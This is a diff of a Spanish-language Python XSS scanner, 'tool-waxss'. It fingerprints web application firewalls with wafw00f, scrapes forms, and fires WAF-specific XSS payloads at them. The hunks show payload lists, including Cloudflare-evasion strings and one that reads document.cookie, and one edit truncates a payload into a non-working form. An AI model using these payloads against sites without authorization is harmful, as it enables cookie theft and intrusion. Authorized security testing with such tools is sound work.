@@ -55,7 +55,6 @@ def detectar_waf(url: str, verbose: bool = True):
 
     salida = resultado.stdout or ""
     if "is behind" in salida:
-        # wafw00f suele devolver: "<host> is behind <WAF NAME>"
         waf_detectado = salida.split("is behind")[-1].strip()
         if verbose:
             print(
@@ -82,7 +81,6 @@ def extraer_formularios(url: str, timeout: int = 20, render_js: bool = True, ver
         if render_js:
             if verbose:
                 print(f"{Fore.BLUE}[*] Renderizando JavaScript…{Style.RESET_ALL}")
-            # Renderizar JS para intentar capturar formularios dinámicos
             response.html.render(timeout=timeout)
 
         html_content = response.html.html if hasattr(response, "html") else response.text
@@ -142,7 +140,6 @@ def extraer_formularios(url: str, timeout: int = 20, render_js: bool = True, ver
 
 def obtener_payloads(waf_detectado):
     'Devuelve la lista de payloads a usar según el WAF detectado.'
-    # Payloads básicos de XSS
     payloads_basicos = [
         "<script>alert(1)</script>",
         "'><script>alert(1)</script>",
@@ -155,7 +152,7 @@ def obtener_payloads(waf_detectado):
             "'><A HRef=' AutoFocus OnFocus=top//?. >",
         ],
         "cloudflare": [
-            "<svg/onload=window['al'+'ert'](1337)>",
+            "<svg/onload=window>",
             "<Svg Only=1 OnLoad=confirm(document.cookie)>",
         ],
         "cloudfront": [
@@ -186,7 +183,6 @@ def obtener_payloads(waf_detectado):
             )
             return waf_list + payloads_basicos
 
-    # Si el WAF no está mapeado, usamos los básicos igualmente
     return payloads_basicos
 
 
@@ -235,7 +231,6 @@ def probar_xss(formularios, waf_detectado, timeout: int = 10, verbose: bool = Fa
                         print(
                             f"{Fore.RED}[!] Posible XSS detectado en {url} (campo: {input_name}) con payload:{Style.RESET_ALL}\n    {payload}\n"
                         )
-                        # No seguimos probando más payloads sobre este campo
                         break
 
                 except requests.RequestException as e:
@@ -248,30 +243,40 @@ def parse_args():
     parser = argparse.ArgumentParser(
         description="tool-waxss – Detección básica de WAF y pruebas de XSS en formularios web."
     )
+
     parser.add_argument(
         "-u",
         "--url",
         required=True,
         help="URL objetivo (por ejemplo, https://example.com)",
     )
+
     parser.add_argument(
         "--skip-waf",
         action="store_true",
         help="No ejecutar detección de WAF con wafw00f.",
     )
+
     parser.add_argument(
         "--no-js",
         action="store_true",
-        help="No intentar renderizar JavaScript (más rápido, menos completo).",\    )
+        help="No intentar renderizar JavaScript (más rápido, menos completo).",
+    )
+
     parser.add_argument(
-        "--timeout",\        type=int,
+        "--timeout",
+        type=int,
         default=20,
-        help="Timeout en segundos para las peticiones HTTP (por defecto 20).",\    )
+        help="Timeout en segundos para las peticiones HTTP (por defecto 20).",
+    )
+
     parser.add_argument(
         "-v",
         "--verbose",
         action="store_true",
-        help="Modo verbose (muestra más información de lo que va haciendo).",\    )
+        help="Modo verbose (muestra más información de lo que va haciendo).",
+    )
+
     return parser.parse_args()
 
 
